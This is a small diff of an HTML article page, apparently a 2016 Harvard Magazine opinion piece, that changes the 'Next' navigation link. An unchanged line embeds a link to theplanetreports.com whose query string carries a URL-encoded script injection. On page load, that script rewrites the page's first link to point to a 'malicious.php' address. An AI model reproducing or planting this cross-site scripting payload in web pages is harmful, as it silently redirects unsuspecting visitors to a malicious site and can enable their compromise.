@@ -19,7 +19,7 @@
 
 <p class="details">by JONATHAN SHAW |SEPTEMBER-OCTOBER 2016 <a href="#">Harvard Magazine</a> </p>
 <h2 align="right"><a href="20160829-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160831-opinion.php"> Next </a> </h2>
 
 <blockquote><b>
  <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> 
